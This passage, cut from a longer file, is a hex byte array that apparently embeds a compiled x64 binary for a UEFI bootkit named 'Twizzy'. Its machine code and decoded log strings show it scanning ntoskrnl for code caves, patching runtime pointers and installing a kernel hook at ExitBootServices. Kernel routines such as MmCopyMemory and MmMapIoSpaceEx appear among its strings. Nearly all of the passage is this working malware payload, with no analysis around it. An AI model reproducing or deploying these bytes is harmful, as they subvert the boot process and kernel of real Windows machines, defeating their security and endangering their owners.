    0xC8, 0x48, 0x89, 0x4D, 0x98, 0x49, 0x0F, 0xBA, 0xE6, 0x0D, 0x72, 0x31, 0x48, 0x8B, 0x55, 0xC0,
    0x48, 0x85, 0xDB, 0x74, 0x2C, 0x41, 0xB9, 0x20, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x6C, 0x24, 0x20,
    0x48, 0x8B, 0xCB, 0xE8, 0x8C, 0xF4, 0xFF, 0xFF, 0x4C, 0x8B, 0x55, 0x90, 0x48, 0x8B, 0xD8, 0x48,
    0x8B, 0x4D, 0x98, 0x4C, 0x8B, 0x4D, 0xD0, 0x48, 0x89, 0x45, 0x88, 0xEB, 0x04, 0x48, 0x8B, 0x55,
    0xC0, 0x45, 0x84, 0xDB, 0x0F, 0x84, 0xA5, 0x00, 0x00, 0x00, 0x8B, 0x45, 0xB0, 0x48, 0x8B, 0x55,
    0x98, 0x84, 0xC0, 0x74, 0x4C, 0x49, 0x03, 0xD5, 0x48, 0x89, 0x55, 0x98, 0x49, 0x0F, 0xBA, 0xE6,
    0x0D, 0x72, 0x3E, 0x4C, 0x8B, 0x5D, 0xC0, 0x48, 0x85, 0xDB, 0x74, 0x39, 0x0F, 0xB6, 0xD0, 0x33,
    0xC9, 0x49, 0x3B, 0xDB, 0x73, 0x21, 0x88, 0x03, 0x49, 0x83, 0xFD, 0x01, 0x74, 0x0D, 0x48, 0x8B,
    0xC2, 0x48, 0xC1, 0xE8, 0x08, 0x88, 0x43, 0x01, 0x8B, 0x45, 0xB0, 0x49, 0x03, 0xDD, 0x48, 0xFF,
    0xC1, 0x48, 0x83, 0xF9, 0x01, 0x7C, 0xDA, 0x48, 0x8B, 0x55, 0x98, 0x48, 0x89, 0x5D, 0x88, 0xEB,
    0x04, 0x4C, 0x8B, 0x5D, 0xC0, 0x4D, 0x8B, 0xC1, 0x4D, 0x2B, 0xC2, 0x49, 0x8B, 0xC0, 0x49, 0x0F,
    0xAF, 0xC5, 0x48, 0x03, 0xD0, 0x48, 0x89, 0x55, 0x98, 0x49, 0x0F, 0xBA, 0xE6, 0x0D, 0x0F, 0x82,
    0xBB, 0x00, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0xB2, 0x00, 0x00, 0x00, 0x41, 0xB9, 0x30,
    0x00, 0x00, 0x00, 0x4C, 0x89, 0x6C, 0x24, 0x20, 0x49, 0x8B, 0xD3, 0x48, 0x8B, 0xCB, 0xE8, 0xD1,
    0xF3, 0xFF, 0xFF, 0x48, 0x8B, 0xD8, 0x48, 0x89, 0x45, 0x88, 0xE9, 0x8C, 0x00, 0x00, 0x00, 0x4D,
    0x8B, 0xC1, 0x4D, 0x8B, 0xDE, 0x4D, 0x2B, 0xC2, 0x49, 0x8B, 0xC0, 0x49, 0x0F, 0xAF, 0xC5, 0x48,
    0x03, 0xC8, 0x48, 0x89, 0x4D, 0x98, 0x41, 0x81, 0xE3, 0x00, 0x20, 0x00, 0x00, 0x75, 0x1D, 0x48,
    0x85, 0xDB, 0x74, 0x18, 0x45, 0x8D, 0x4B, 0x20, 0x4C, 0x89, 0x6C, 0x24, 0x20, 0x48, 0x8B, 0xCB,
    0xE8, 0x8F, 0xF3, 0xFF, 0xFF, 0x48, 0x8B, 0xD8, 0x48, 0x89, 0x45, 0x88, 0x8B, 0x45, 0xB0, 0x84,
    0xC0, 0x74, 0x48, 0x48, 0x8B, 0x55, 0x98, 0x49, 0x03, 0xD5, 0x48, 0x89, 0x55, 0x98, 0x4D, 0x85,
    0xDB, 0x75, 0x3C, 0x48, 0x85, 0xDB, 0x74, 0x37, 0x4C, 0x8B, 0x45, 0xC0, 0x33, 0xC9, 0x0F, 0xB6,
    0xD0, 0x49, 0x3B, 0xD8, 0x73, 0x21, 0x88, 0x03, 0x49, 0x83, 0xFD, 0x01, 0x74, 0x0D, 0x48, 0x8B,
    0xC2, 0x48, 0xC1, 0xE8, 0x08, 0x88, 0x43, 0x01, 0x8B, 0x45, 0xB0, 0x49, 0x03, 0xDD, 0x48, 0xFF,
    0xC1, 0x48, 0x83, 0xF9, 0x01, 0x7C, 0xDA, 0x48, 0x89, 0x5D, 0x88, 0x48, 0x8B, 0x55, 0x98, 0x4C,
    0x8B, 0x55, 0x90, 0x45, 0x33, 0xC0, 0x44, 0x38, 0x45, 0xB0, 0x41, 0x0F, 0x95, 0xC0, 0x4D, 0x3B,
    0xC2, 0x0F, 0x83, 0xED, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x5D, 0xF0, 0x4D, 0x8B, 0xCE, 0x41, 0x81,
    0xE1, 0x00, 0x20, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x75, 0x14, 0x48, 0x83, 0xFE, 0x01, 0x0F, 0x8E,
    0xCC, 0x00, 0x00, 0x00, 0x80, 0x7F, 0x01, 0x00, 0x0F, 0x84, 0xC2, 0x00, 0x00, 0x00, 0x0F, 0xB6,
    0x4F, 0x01, 0x49, 0x03, 0xD5, 0x0F, 0xB6, 0x07, 0x48, 0xC1, 0xE1, 0x08, 0x48, 0x0B, 0xC8, 0x48,
    0x89, 0x55, 0x98, 0x49, 0x23, 0xCF, 0x4D, 0x85, 0xC9, 0x75, 0x36, 0x48, 0x85, 0xDB, 0x74, 0x31,
    0x48, 0x8B, 0x45, 0xC0, 0x33, 0xD2, 0x48, 0x3B, 0xD8, 0x73, 0x22, 0x88, 0x0B, 0x49, 0x83, 0xFD,
    0x01, 0x74, 0x0E, 0x48, 0x8B, 0xC1, 0x48, 0xC1, 0xE8, 0x08, 0x88, 0x43, 0x01, 0x48, 0x8B, 0x45,
    0xC0, 0x49, 0x03, 0xDD, 0x48, 0xFF, 0xC2, 0x48, 0x83, 0xFA, 0x01, 0x7C, 0xD9, 0x48, 0x8B, 0x55,
    0x98, 0x48, 0x03, 0xFE, 0x49, 0xFF, 0xC0, 0x80, 0x7D, 0x81, 0x00, 0x74, 0x5A, 0x49, 0xFF, 0xC3,
    0x49, 0x83, 0xFB, 0x03, 0x75, 0x51, 0x45, 0x33, 0xDB, 0x49, 0xFF, 0xC0, 0x4D, 0x3B, 0xC2, 0x73,
    0x4F, 0x49, 0x03, 0xD5, 0x48, 0x89, 0x55, 0x98, 0x4D, 0x85, 0xC9, 0x0F, 0x85, 0x64, 0xFF, 0xFF,
    0xFF, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0x5B, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x4D, 0xC0, 0x33, 0xC0,
    0x48, 0x3B, 0xD9, 0x0F, 0x83, 0x4C, 0xFF, 0xFF, 0xFF, 0xC6, 0x03, 0x2C, 0x49, 0x83, 0xFD, 0x01,
    0x74, 0x04, 0x44, 0x88, 0x5B, 0x01, 0x49, 0x03, 0xDD, 0x48, 0xFF, 0xC0, 0x48, 0x83, 0xF8, 0x01,
    0x7C, 0xDE, 0xE9, 0x2E, 0xFF, 0xFF, 0xFF, 0x4D, 0x3B, 0xC2, 0x0F, 0x82, 0x25, 0xFF, 0xFF, 0xFF,
    0x48, 0x89, 0x5D, 0x88, 0x41, 0xB9, 0x01, 0x02, 0x00, 0x00, 0x49, 0x8B, 0xC6, 0x49, 0x23, 0xC1,
    0x49, 0x3B, 0xC1, 0x75, 0x43, 0x48, 0x8B, 0x4D, 0xE8, 0x48, 0x2B, 0x4D, 0xD0, 0x48, 0x8B, 0xC1,
    0x49, 0x0F, 0xAF, 0xC5, 0x48, 0x03, 0xD0, 0x48, 0x89, 0x55, 0x98, 0x49, 0x0F, 0xBA, 0xE6, 0x0D,
    0x72, 0x26, 0x48, 0x85, 0xDB, 0x74, 0x21, 0x48, 0x8B, 0x55, 0xC0, 0x4C, 0x8B, 0xC1, 0x48, 0x8B,
    0xCB, 0x4C, 0x89, 0x6C, 0x24, 0x20, 0x41, 0xB9, 0x20, 0x00, 0x00, 0x00, 0xE8, 0xE3, 0xF1, 0xFF,
    0xFF, 0x48, 0x8B, 0xD8, 0x48, 0x89, 0x45, 0x88, 0x4C, 0x8B, 0x7D, 0xF8, 0x41, 0xBB, 0x01, 0x00,
    0x00, 0x00, 0x4D, 0x03, 0xE7, 0x4D, 0x3B, 0xFB, 0x75, 0x04, 0x33, 0xC0, 0xEB, 0x09, 0x41, 0x0F,
    0xBE, 0x44, 0x24, 0x01, 0xC1, 0xE0, 0x08, 0x41, 0x0F, 0xB6, 0x0C, 0x24, 0x4C, 0x8D, 0x0D, 0x3D,
    0x0D, 0x00, 0x00, 0x48, 0x8B, 0x75, 0xA0, 0x4C, 0x8B, 0x45, 0xC0, 0x48, 0x8B, 0x7D, 0xA8, 0x48,
    0x98, 0x48, 0x0B, 0xC8, 0x48, 0x23, 0x4D, 0xE0, 0x48, 0x89, 0x4D, 0xD8, 0x48, 0x8B, 0xC1, 0x0F,
    0x85, 0x55, 0xF3, 0xFF, 0xFF, 0x4C, 0x8B, 0x4D, 0x98, 0x49, 0x0F, 0xBA, 0xE6, 0x0D, 0x73, 0x0D,
    0x33, 0xD2, 0x49, 0x8B, 0xC1, 0x49, 0xF7, 0xF5, 0xE9, 0x0E, 0xF2, 0xFF, 0xFF, 0x48, 0x8B, 0xC3,
    0x4B, 0x8D, 0x14, 0x28, 0x33, 0xC9, 0x48, 0x3B, 0xC2, 0x73, 0x17, 0xC6, 0x00, 0x00, 0x4D, 0x3B,
    0xEB, 0x74, 0x04, 0xC6, 0x40, 0x01, 0x00, 0x49, 0x03, 0xC5, 0x49, 0x03, 0xCB, 0x49, 0x3B, 0xCB,
    0x7C, 0xE4, 0x48, 0x2B, 0x5D, 0x00, 0x48, 0x8B, 0xC3, 0x48, 0x99, 0x49, 0xF7, 0xFD, 0xE9, 0xD8,
    0xF1, 0xFF, 0xFF, 0xCC, 0x4C, 0x8B, 0xDC, 0x4D, 0x89, 0x4B, 0x20, 0x48, 0x83, 0xEC, 0x38, 0x49,
    0x8D, 0x43, 0x28, 0x49, 0xC7, 0x43, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x49, 0x89, 0x43, 0xE8, 0xE8,
    0x54, 0xF1, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xC2, 0x00, 0x00, 0xCC,
    0x48, 0x8B, 0x05, 0x61, 0x16, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x72, 0x16, 0x00, 0x00, 0x33, 0xC9,
    0x4C, 0x8B, 0x40, 0x40, 0x49, 0xFF, 0xE0, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C,
    0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x49, 0x8B, 0xD8, 0x48,
    0x8B, 0xF2, 0x48, 0x8B, 0xE9, 0xE8, 0xB2, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x48, 0x85, 0xC0,
    0x74, 0x62, 0xBA, 0x41, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00,
    0x4C, 0x8B, 0xCD, 0x48, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0xCF, 0x44, 0x8D, 0x42, 0xFF, 0xE8,
    0xE4, 0xF0, 0xFF, 0xFF, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xF6, 0x74, 0x25, 0x48, 0x85, 0xC0, 0x74,
    0x20, 0x4C, 0x8B, 0x46, 0x08, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xCE, 0x41, 0xFF, 0xD0, 0x48, 0xB9,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x48, 0x3B, 0xC1, 0x48, 0x1B, 0xC9, 0x48, 0x23,
    0xD9, 0x48, 0x8B, 0x05, 0xC0, 0x15, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0x48, 0x8B, 0x50, 0x48, 0xFF,
    0xD2, 0x48, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B,
    0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48,
    0x89, 0x48, 0x08, 0x48, 0x89, 0x50, 0x10, 0x4C, 0x89, 0x40, 0x18, 0x4C, 0x89, 0x48, 0x20, 0x48,
    0x83, 0xEC, 0x28, 0x48, 0x8B, 0x15, 0x76, 0x15, 0x00, 0x00, 0x4C, 0x8D, 0x40, 0x10, 0x48, 0x8B,
    0x52, 0x40, 0xE8, 0x31, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x48, 0x89, 0x54, 0x24,
    0x10, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x05, 0x5C, 0x15, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24,
    0x38, 0xBA, 0x82, 0x02, 0x00, 0x00, 0xB9, 0x04, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x48, 0x40, 0x41,
    0xFF, 0xD1, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x48, 0x3B, 0xC1, 0x72,
    0x04, 0x33, 0xC0, 0xEB, 0x05, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D, 0x20, 0x4E, 0x74, 0x46, 0x69, 0x6C, 0x74, 0x65,
    0x72, 0x42, 0x6F, 0x6F, 0x74, 0x4F, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x76, 0x69, 0x61, 0x20,
    0x73, 0x63, 0x61, 0x6E, 0x3A, 0x20, 0x25, 0x70, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D, 0x20, 0x4E, 0x74, 0x46, 0x69, 0x6C, 0x74, 0x65,
    0x72, 0x42, 0x6F, 0x6F, 0x74, 0x4F, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x6E, 0x6F, 0x74, 0x20,
    0x66, 0x6F, 0x75, 0x6E, 0x64, 0x0D, 0x0A, 0x00, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x20,
    0x73, 0x77, 0x69, 0x74, 0x63, 0x68, 0x20, 0x70, 0x74, 0x72, 0x20, 0x69, 0x73, 0x20, 0x30, 0x0A,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x53, 0x63, 0x61, 0x6E, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x63, 0x61, 0x76, 0x65, 0x73, 0x20,
    0x69, 0x6E, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x20, 0x25, 0x70, 0x20, 0x28,
    0x6E, 0x65, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x62, 0x79, 0x74, 0x65, 0x73, 0x29,
    0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x20, 0x20, 0x5B, 0x25, 0x2E, 0x38, 0x73, 0x5D, 0x20, 0x73, 0x6C, 0x61, 0x63, 0x6B, 0x20,
    0x40, 0x20, 0x25, 0x70, 0x20, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C,
    0x78, 0x20, 0x20, 0x28, 0x77, 0x3A, 0x25, 0x64, 0x29, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D, 0x20, 0x42, 0x65, 0x73, 0x74, 0x20, 0x63, 0x61,
    0x76, 0x65, 0x3A, 0x20, 0x25, 0x70, 0x20, 0x69, 0x6E, 0x20, 0x5B, 0x25, 0x2E, 0x38, 0x73, 0x5D,
    0x20, 0x28, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x62, 0x79, 0x74, 0x65, 0x73, 0x29, 0x0D,
    0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x4E, 0x6F, 0x20, 0x63, 0x61, 0x76, 0x65, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x21, 0x0D,
    0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x20,
    0x42, 0x6F, 0x6F, 0x74, 0x6B, 0x69, 0x74, 0x5D, 0x20, 0x45, 0x78, 0x69, 0x74, 0x42, 0x6F, 0x6F,
    0x74, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x65, 0x64,
    0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x6E, 0x00, 0x74, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x6B, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x6C, 0x00,
    0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D, 0x20, 0x6E, 0x6F, 0x20, 0x63, 0x61, 0x76, 0x65,
    0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x2C, 0x20, 0x61, 0x62, 0x6F, 0x72, 0x74, 0x69, 0x6E, 0x67,
    0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x50, 0x73, 0x4C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x42,
    0x79, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x50, 0x73, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x53, 0x65, 0x63, 0x74,
    0x69, 0x6F, 0x6E, 0x42, 0x61, 0x73, 0x65, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x00,
    0x4D, 0x6D, 0x43, 0x6F, 0x70, 0x79, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x00, 0x00, 0x00,
    0x4D, 0x6D, 0x4D, 0x61, 0x70, 0x49, 0x6F, 0x53, 0x70, 0x61, 0x63, 0x65, 0x45, 0x78, 0x00, 0x00,
    0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x49, 0x6F, 0x53, 0x70, 0x61, 0x63, 0x65, 0x00, 0x00,
    0x4D, 0x6D, 0x47, 0x65, 0x74, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x46, 0x6F, 0x72, 0x50,
    0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x4D, 0x6D, 0x47, 0x65, 0x74, 0x50, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x4D, 0x65, 0x6D,
    0x6F, 0x72, 0x79, 0x52, 0x61, 0x6E, 0x67, 0x65, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x4B, 0x65, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x54, 0x68, 0x72, 0x65,
    0x61, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x50, 0x73, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x50, 0x65, 0x62, 0x00,
    0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69, 0x74, 0x41, 0x6E, 0x73, 0x69, 0x53, 0x74, 0x72, 0x69, 0x6E,
    0x67, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x52, 0x74, 0x6C, 0x41, 0x6E, 0x73, 0x69, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x54, 0x6F, 0x55,
    0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0x00, 0x00,
    0x52, 0x74, 0x6C, 0x43, 0x6F, 0x6D, 0x70, 0x61, 0x72, 0x65, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64,
    0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x52, 0x74, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74,
    0x72, 0x69, 0x6E, 0x67, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x3A, 0x20, 0x25, 0x70, 0x0D, 0x0A, 0x00,
    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D, 0x20, 0x63, 0x61, 0x76, 0x65, 0x20, 0x40, 0x20,
    0x25, 0x70, 0x20, 0x72, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x20, 0x40, 0x20, 0x25, 0x70, 0x0D,
    0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x4E, 0x74, 0x46, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x42, 0x6F, 0x6F, 0x74, 0x4F, 0x70, 0x74,
    0x69, 0x6F, 0x6E, 0x3A, 0x20, 0x25, 0x70, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D, 0x20, 0x43, 0x2B, 0x2B, 0x20, 0x68, 0x61, 0x6E,
    0x64, 0x6C, 0x65, 0x72, 0x20, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x65, 0x64, 0x3A,
    0x20, 0x25, 0x70, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x20,
    0x42, 0x6F, 0x6F, 0x74, 0x6B, 0x69, 0x74, 0x5D, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x69, 0x6E, 0x67,
    0x20, 0x6F, 0x72, 0x69, 0x67, 0x69, 0x6E, 0x61, 0x6C, 0x20, 0x45, 0x78, 0x69, 0x74, 0x42, 0x6F,
    0x6F, 0x74, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00,
    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D, 0x20, 0x63, 0x72, 0x30, 0x3A, 0x20, 0x25, 0x70,
    0x20, 0x63, 0x72, 0x34, 0x3A, 0x20, 0x25, 0x70, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D, 0x20, 0x68, 0x6F, 0x6F, 0x6B, 0x20, 0x77, 0x72,
    0x69, 0x74, 0x74, 0x65, 0x6E, 0x0D, 0x0A, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x56, 0x41, 0x20, 0x43, 0x68, 0x61, 0x6E, 0x67, 0x65, 0x20, 0x2D, 0x20, 0x66, 0x69, 0x6E,
    0x61, 0x6C, 0x69, 0x7A, 0x69, 0x6E, 0x67, 0x20, 0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x20, 0x68,
    0x6F, 0x6F, 0x6B, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x6E, 0x6F, 0x20, 0x70, 0x65, 0x6E, 0x64, 0x69, 0x6E, 0x67, 0x20, 0x45, 0x42, 0x53, 0x20,
    0x68, 0x6F, 0x6F, 0x6B, 0x20, 0x73, 0x74, 0x61, 0x74, 0x65, 0x2C, 0x20, 0x73, 0x6B, 0x69, 0x70,
    0x70, 0x69, 0x6E, 0x67, 0x0D, 0x0A, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x43, 0x2B, 0x2B, 0x20, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x20, 0x62, 0x65, 0x66,
    0x6F, 0x72, 0x65, 0x20, 0x56, 0x41, 0x20, 0x63, 0x6F, 0x6E, 0x76, 0x65, 0x72, 0x74, 0x3A, 0x20,
    0x25, 0x70, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x43, 0x2B, 0x2B, 0x20, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x20, 0x61, 0x66, 0x74,
    0x65, 0x72, 0x20, 0x56, 0x41, 0x20, 0x63, 0x6F, 0x6E, 0x76, 0x65, 0x72, 0x74, 0x3A, 0x20, 0x25,
    0x70, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x72, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x20, 0x70, 0x74, 0x72, 0x20, 0x70, 0x61, 0x74,
    0x63, 0x68, 0x65, 0x64, 0x20, 0x69, 0x6E, 0x20, 0x63, 0x61, 0x76, 0x65, 0x3A, 0x20, 0x25, 0x70,
    0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D,
    0x20, 0x4E, 0x74, 0x46, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x42, 0x6F, 0x6F, 0x74, 0x4F, 0x70, 0x74,
    0x69, 0x6F, 0x6E, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x2C, 0x20, 0x68,
    0x6F, 0x6F, 0x6B, 0x20, 0x73, 0x6B, 0x69, 0x70, 0x70, 0x65, 0x64, 0x0D, 0x0A, 0x00, 0x00, 0x00,
    0x5B, 0x54, 0x77, 0x69, 0x7A, 0x7A, 0x79, 0x5D, 0x20, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x20,
    0x68, 0x6F, 0x6F, 0x6B, 0x20, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x65, 0x64, 0x20, 0x66,
    0x72, 0x6F, 0x6D, 0x20, 0x45, 0x42, 0x53, 0x20, 0x73, 0x74, 0x61, 0x74, 0x65, 0x0D, 0x0A, 0x00,
